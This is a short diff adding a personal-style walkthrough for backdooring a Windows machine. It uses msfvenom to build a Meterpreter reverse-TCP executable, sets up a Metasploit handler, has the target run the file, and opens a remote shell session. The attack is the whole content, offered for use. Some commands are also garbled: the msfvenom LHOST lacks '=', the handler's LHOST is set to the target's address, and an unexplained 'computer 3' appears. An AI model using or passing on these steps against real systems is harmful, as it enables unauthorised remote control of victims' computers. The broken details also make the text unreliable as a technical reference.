@@ -1,4 +1,26 @@
 computer 1 192.168.239.139 (attacker) and computer 2 192.168.1.105 (target)
 
-create win_backdoor.exe 
+computer 1 :
+  1.create win_backdoor.exe 
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST 192.168.239.139 LPORT=1234 -f exe -o win_backdoor.exe
   
+  2.open matesploit
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST 192.168.1.105
+    set LPORT 1234
+   
+computer 2:
+  3.run win_backdoor.exe
+    cmd> win_backdoor.exe
+    
+computer 3:
+  4.exploit back door
+    exploit
+  5 open session
+    sessions -i
+    sessions -i 1
+    
+ok  you can run shell in windows(target)
+
+copy by 
